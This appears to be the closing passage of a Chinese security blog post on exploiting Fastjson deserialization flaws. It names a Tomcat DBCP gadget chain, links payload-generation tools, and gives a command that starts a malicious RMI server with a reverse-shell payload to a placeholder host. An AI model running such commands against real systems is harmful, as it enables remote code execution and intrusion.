<h2 id="org-apache-tomcat-dbcp-dbcp2-BasicDataSource"><a href="#org-apache-tomcat-dbcp-dbcp2-BasicDataSource" class="headerlink" title="org.apache.tomcat.dbcp.dbcp2.BasicDataSource"></a>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</h2><p>(tomcat-dbcp:7.x, tomcat-dbcp:9.x, commons-dbcp:1.4)</p>
<p>插件地址</p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/bigsizeme/fastjson-check">https://github.com/bigsizeme/fastjson-check</a></p>
<p>一键生成链子</p>
<p>看不到type类型，自行往右拉。</p>
<p>先config 选择  然后Generte Echo payload</p>
<p><img src="/2022/498480683/image.png" alt="img"></p>
<p><img src="/2022/498480683/image.png" alt="img"></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://jishuin.proginn.com/p/763bfbd63f5d">https://jishuin.proginn.com/p/763bfbd63f5d</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://cloud.tencent.com/developer/article/1785575">https://cloud.tencent.com/developer/article/1785575</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://xz.aliyun.com/t/7104">https://xz.aliyun.com/t/7104</a></p>
<h1 id="0x06-综合利用脚本"><a href="#0x06-综合利用脚本" class="headerlink" title="0x06 综合利用脚本"></a>0x06 综合利用脚本</h1><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://toolaffix.oss-cn-beijing.aliyuncs.com/wyzxxz/jndi_tool.jar">https://toolaffix.oss-cn-beijing.aliyuncs.com/wyzxxz/jndi_tool.jar</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp fastjson_tool.jar fastjson.HRMIServer 1.1.1.1 8888 <span class="string">&quot;bash=bash -i &gt;&amp;/dev/tcp/x.x.x.x/80 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>

<p>官网 <a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/wyzxxz/jndi_tool">https://github.com/wyzxxz/jndi_tool</a></p>
<p>参考链接</p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://jishuin.proginn.com/p/763bfbd63f5d">https://jishuin.proginn.com/p/763bfbd63f5d</a>   Fastjson三条利用链</p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.cnblogs.com/pickmea/p/15157189.html">https://www.cnblogs.com/pickmea/p/15157189.html</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg">https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/">https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/</a></p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.cnblogs.com/hei-zi/p/13274272.html">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="followme">
  <span>欢迎关注我的其它发布渠道</span>

  <div class="social-list">

      <div class="social-item">
        <a target="_blank" class="social-link" href="/atom.xml">
          <span class="icon">
            <i class="fa fa-rss"></i>
          </span>

          <span class="label">RSS</span>
        </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/Fastjson/" rel="tag"># Fastjson</a>
              <a href="/tags/Java/" rel="tag"># Java</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/1386849462/" rel="prev" title="N1 软路由刷 openwrt">
                  <i class="fa fa-chevron-left"></i> N1 软路由刷 openwrt
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/937989325/" rel="next" title="CS 域前置+流量混淆">
                  CS 域前置+流量混淆 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments" id="waline-comments"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2021 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fz1lin</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>站点总字数：</span>
    <span title="站点总字数">54k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">49 分钟</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener external nofollow noreferrer" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  
<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>



  <script src="/js/third-party/fancybox.js"></script>


  




<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"https://blog-api-25jf3kruh-fz1lin.vercel.app/","placeholder":"靓仔，来评论呀","avatar":"mm","pageSize":10,"visitor":false,"comment_count":true,"requiredFields":[],"meta":["nick","mail","link"],"requiredMeta":[],"libUrl":"https://cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js","el":"#waline-comments","path":"/2022/498480683/"}</script>
<script>
document.addEventListener('page:loaded', () => {
  NexT.utils.loadComments(CONFIG.waline.el).then(() => 
    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
  ).then(() => {
    new Waline(CONFIG.waline);
  });
});
</script><script src="https://cdn.jsdelivr.net/npm/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>

<script>
var options = {
  bottom: '64px',
  right: 'unset',
  left: '32px',
  time: '0.5s',
  mixColor: 'transparent',
  backgroundColor: 'transparent',
  buttonColorDark: '#100f2c',
  buttonColorLight: '#fff',
  saveInCookies: true,
  label: '🌓',
  autoMatchOsTheme: true
}
const darkmode = new Darkmode(options);
window.darkmode = darkmode;
darkmode.showWidget();
</script>

</body>
</html>
